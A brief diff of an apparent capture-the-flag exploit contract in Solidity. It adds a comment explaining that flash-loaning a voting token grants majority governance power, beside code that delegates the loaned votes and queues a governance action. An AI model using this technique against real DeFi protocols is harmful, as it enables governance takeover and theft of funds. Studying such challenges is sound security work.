@@ -114,6 +114,7 @@ contract Rescuer {
     }
 
     function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
+        // The bug is that you can flashloan voting token to gain majority voting power
         require(token.balanceOf(address(this)) == TOKENS_IN_POOL, "Not enough tokens received");
         token.delegate(address(this));
         governance.queueAction(
